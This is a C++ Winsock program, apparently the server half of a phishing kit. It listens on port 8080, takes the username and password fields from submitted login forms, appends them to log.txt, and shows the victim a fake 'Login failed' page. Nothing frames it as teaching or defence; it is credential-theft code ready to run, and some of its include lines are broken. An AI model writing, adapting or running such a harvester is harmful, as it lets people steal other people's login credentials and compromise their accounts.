#include 
<winsock2.h> 
#include 
<ws2tcpip.h> 


#pragma comment(lib, "Ws2_32.lib") #define PORT 8080

std::string extractCredentials(const std::string& body) { std::string username, password; size_t userPos = body.find("username="); size_t passPos = body.find("password="); if (userPos != std::string::npos && passPos != std::string::npos) { username = body.substr(userPos + 9, body.find("&") - (userPos + 9)); password = body.substr(passPos + 9); } return "Username: " + username + " | Password: " + password + "\n"; }

int main() { WSADATA wsaData; SOCKET serverSocket, clientSocket; sockaddr_in serverAddr, clientAddr; int addrLen = sizeof(clientAddr); char buffer[10000];

if (WSAStartup(MAKEWORD(2,2), &wsaData)) {
    std::cerr << "WSAStartup failed.\n";
    return 1;
}


serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (serverSocket == INVALID_SOCKET) {
    std::cerr << "Socket creation failed.\n";
    WSACleanup();
    return 1;
}


serverAddr.sin_family = AF_INET;
serverAddr.sin_addr.s_addr = INADDR_ANY;
serverAddr.sin_port = htons(PORT);
if (bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
    std::cerr << "Bind failed.\n";
    closesocket(serverSocket);
    WSACleanup();
    return 1;
}


listen(serverSocket, SOMAXCONN);
std::cout << "[*] Listening on port " << PORT << "...\n";

while (true) {
    clientSocket = accept(serverSocket, (SOCKADDR*)&clientAddr, &addrLen);
    if (clientSocket == INVALID_SOCKET) continue;

    memset(buffer, 0, sizeof(buffer));
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesReceived > 0) {
        std::string request(buffer);
        size_t bodyStart = request.find("\r\n\r\n");
        if (bodyStart != std::string::npos) {
            std::string body = request.substr(bodyStart + 4);
            std::string creds = extractCredentials(body);
            std::ofstream log("log.txt", std::ios::app);
            log << creds;
            log.close();
        }

        std::string response =
            "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
            "<h2>Login failed</h2>";
        send(clientSocket, response.c_str(), response.size(), 0);
    }

    closesocket(clientSocket);
}

closesocket(serverSocket);
WSACleanup();
return 0;

}
